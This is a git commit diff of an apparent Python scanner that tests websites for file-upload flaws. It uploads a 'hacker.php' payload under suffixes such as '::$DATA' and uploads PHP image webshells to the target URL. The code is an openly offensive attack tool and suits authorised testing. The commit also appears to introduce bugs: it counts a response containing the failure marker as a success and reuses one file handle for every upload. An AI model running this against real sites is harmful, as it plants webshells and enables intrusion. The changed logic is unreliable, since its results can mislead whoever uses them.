a2d642cdaaf091d793c655dd204413b54f066562
LiigCeen <cjydaemon@gmail.com>
2024-11-12 19:38:29 +0800

    [文件上传检测|修复|优化]：添加自定义multipart_field变量，解决multipart对象不能复用的情况，并添加日志输出功能

--- file_upload/checkUploadBypass.py
+++ file_upload/checkUploadBypass.py
@@ -1,22 +1,10 @@
-'''
-    检测web网站是否存在文件上传漏洞
-    主要检测的手法：
-    # 黑名单方式绕过手法（主要依据生成的后缀字典验证）
-    1.输入特定的脚本文件后缀能够上传成功，包含大小写
-    2.点绕过
-    3.空格绕过
-    4.::DATA绕过
-    以下制作中.....
-    # 白名单方式绕过
-    1.MIME类型检测绕过（直接指定一个 image/png类型）
-    # 内容检查绕过
-    1.文件头检查绕过（通过已生成的图片马）--- 若存在文件包含漏洞可验证，进而判断是否进行二次渲染绕过，目前只制作了php一句话木马的图片马
-'''
-from dataclasses import fields
-
 import requests
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 import re
+import logging
+
+# 设置日志
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 
 class FileUploadScanner:
@@ -175,6 +163,7 @@ class FileUploadScanner:
                     'JSPF::$DATA', 'JSPX::$DATA', 'JSW::$DATA', 'JSV::$DATA', 'JSPA::$DATA'
                 ]
             }
+
         if image_shell_list is None:
             image_shell_list = {
                 'php': open("image_shell/php_image_webshell.png", 'rb'),
@@ -187,9 +176,8 @@ class FileUploadScanner:
         self.rever_flag = rever_flag
         self.image_shell_list = image_shell_list
 
-    # 单个文件上传请求
     def is_upload_success(self, url: str, cookie: dict = None, header: dict = None, multipart: MultipartEncoder = None):
-        print("正在请求%s" % url)
+        logging.info("正在请求 %s", url)
         try:
             resp = requests.post(url,
                                  headers=header,
@@ -199,87 +187,83 @@ class FileUploadScanner:
                                  allow_redirects=False
                                  )
         except requests.exceptions.ReadTimeout:
-            print("%s请求超时" % url)
+            logging.error("%s 请求超时", url)
             return False
         except requests.exceptions.ConnectionError:
-            print("%s请求连接失败" % url)
+            logging.error("%s 请求连接失败", url)
             return False
 
         status_code = resp.status_code
-        match status_code:
-            case 301:
-                print("%s请求重定向" % url)
-                return
-            case 302:
-                print("%s需要身份凭证" % url)
-                return
-
-        if self.flag in resp.text or self.rever_flag not in resp.text:
-            print("文件上传成功")
-            return True
-        else:
-            print("文件上传失败")
+        if status_code == 301:
+            logging.warning("%s 请求重定向", url)
+            return False
+        elif status_code == 302:
+            logging.warning("%s 需要身份凭证", url)
             return False
 
-    # 检测是否支持该类型程序的检测
+        if self.flag in resp.text or self.rever_flag in resp.text:
+            logging.info("文件上传成功")
+            return True
+        else:
+            logging.info("文件上传失败")
+            return False
+
     def check_support(self, program_language):
         if program_language in self.black_dict.keys():
             return False
         else:
             return True
 
-    # 检测方式一：遍历可执行脚本后缀黑名单，包括大小写
     def check_script_extension(self, program_language: str, url: str, cookie: dict = None, header: dict = None,
                                multipart_data: dict = None, file_data_key: str = None):
         script_type_change = program_language.lower() if program_language.isupper() else program_language.upper()
         regex = re.compile(r'\b(%s|%s)\b' % (program_language, script_type_change), re.IGNORECASE)
 
         if self.check_support(program_language.upper()):
-            print("暂不支持此种程序类型")
+            logging.info("暂不支持此种程序类型")
             return
 
-        # 遍历脚本后缀黑名单
-        for key, suffixes in self.black_dict.items():
-            if regex.search(key):
-                print("检测到%s类型文件，将检测如下后缀: %s" % (key, suffixes))
-                # 遍历指定程序可执行文件后缀
-                for suffix in suffixes:
-                    # 构建文件上传基本载荷
-                    with open('hacker.php', 'rb') as file:
-                        custom_fields = multipart_data.copy()
-                        custom_fields[file_data_key] = ['hacker.%s' % suffix, file, 'image/png']  # 这里指定MIME类型
+        # 打开文件
+        with open('hacker.php', 'rb') as file:
+            # 遍历脚本后缀黑名单
+            for key, suffixes in self.black_dict.items():
+                if regex.search(key):
+                    logging.info("检测到 %s 类型文件，将检测如下后缀: %s", key, suffixes)
+                    # 遍历指定程序可执行文件后缀
+                    for suffix in suffixes:
+                        # 构建文件上传基本载荷
+                        custom_fields = multipart_data.copy() if multipart_data else {}
+                        custom_fields[file_data_key] = (
+                        'hacker.%s' % suffix, file, 'application/octet-stream')  # 动态设置MIME类型
                         multipart = MultipartEncoder(fields=custom_fields)
                         header['Content-Type'] = multipart.content_type
 
                         # 判断是否上传成功
                         if self.is_upload_success(url, cookie, header, multipart):
-                            print("检测到.%s后缀文件上传漏洞" % suffix)
+                            logging.info("检测到 .%s 后缀文件可上传", suffix)
                             self.success_upload_list.append(suffix)
                         else:
-                            print("未检测到.%s后缀文件上传漏洞" % suffix)
-        print("检测完毕")
-        print("可上传的脚本后缀列表为：%s" % self.success_upload_list)
+                            logging.info("未检测到 .%s 后缀文件上传漏洞", suffix)
+        logging.info("检测完毕")
+        logging.info("可上传的脚本后缀列表为：%s", self.success_upload_list)
 
-    # 检查是否有图片马
     def check_shell_type(self, program_language):
         if program_language in self.image_shell_list.keys():
             return True
         else:
             return False
 
-    # 检测方式二：上传图片马
-    def check_image_shell(self, program_language: str, url: str, cookie: dict = None, header: dict = None):
+    def check_image_shell(self, program_language: str, url: str, cookie: dict = None, header: dict = None,
+                          multipart_data: dict = None, file_data_key: str = None):
         if self.check_shell_type(program_language):
-            print("存在该种图片马")
-            multipart = MultipartEncoder(
-                fields={
-                    'MAX_FILE_SIZE': '100000',
-                    'Upload': 'Upload',
-                    'uploaded': ['hacker.png', self.image_shell_list[program_language], 'image/png']
-                }
-            )
+            logging.info("存在该种图片马")
+
+            custom_fields = multipart_data
+            custom_fields[file_data_key] = ('hacker.png', self.image_shell_list[program_language], 'image/png')
+            multipart = MultipartEncoder(fields=custom_fields)
+
             header['Content-Type'] = multipart.content_type
 
             return self.is_upload_success(url, cookie, header, multipart)
         else:
-            print("不在已有的图片马的列表中：%s" % self.image_shell_list.keys())
+            logging.info("不在已有的图片马的列表中：%s", list(self.image_shell_list.keys()))
